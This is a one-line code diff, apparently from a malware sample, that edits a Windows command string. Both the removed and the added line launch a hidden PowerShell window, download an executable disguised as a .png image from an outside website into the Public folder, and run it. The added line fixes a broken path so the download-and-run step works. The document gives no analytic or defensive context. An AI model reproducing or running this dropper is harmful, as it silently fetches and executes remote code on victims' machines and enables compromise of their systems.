@@ -1,1 +1,1 @@
-c:\ & cls & start cmd.exe /c powershell.exe -windowstyle hidden -c (new-object System.Net.WebClient).Downloadfile('https://www.flagstafftownhomes.com/d/MyAppleOrange.png','C://Users/Public//https://www.flagstafftownhomes.com/d/MyAppleOrange.exe');start C:\Users\Public\https://www.flagstafftownhomes.com/d/MyAppleOrange.exe
+c:\ & cls & start cmd.exe /c powershell.exe -windowstyle hidden -c (new-object System.Net.WebClient).Downloadfile('https://www.flagstafftownhomes.com/d/MyAppleOrange.png','C://Users/Public//MyAppleOrange.exe');start C:\Users\Public\MyAppleOrange.exe
